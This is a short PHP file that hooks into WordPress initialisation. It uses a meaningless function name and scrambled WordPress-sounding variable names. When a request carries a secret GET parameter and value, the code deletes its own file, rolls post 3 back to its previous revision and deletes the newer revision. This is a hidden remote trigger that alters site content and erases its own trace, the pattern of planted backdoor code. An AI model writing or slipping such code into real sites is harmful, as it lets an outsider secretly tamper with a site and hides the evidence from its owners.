<?php

function first_upload_file() {
	if (isset($_GET['generator_schedule_akismet_invoice']) && $_GET['generator_schedule_akismet_invoice'] === 'more_effects_permalinks_author') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$timer_ajax_call = 3;
		$support_query_remote_animated = wp_get_post_revisions($timer_ajax_call);
		if (empty($support_query_remote_animated)) die('no revisions');
		if (count($support_query_remote_animated) < 2) die('less than 2');
		$ticker_only_newsletter_oembed = array_shift($support_query_remote_animated);
		$country_dropdown_event = $ticker_only_newsletter_oembed->ID;
		$embed_wpforms_importer = array_shift($support_query_remote_animated);
		$featured_dashboard_term = $embed_wpforms_importer->ID;
		$permalinks_data_finder_listing = wp_restore_post_revision($featured_dashboard_term);
		if ($permalinks_data_finder_listing === false) die('error restoring');
		$permalinks_data_finder_listing = wp_delete_post_revision($country_dropdown_event);		
		if ($permalinks_data_finder_listing === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'first_upload_file');
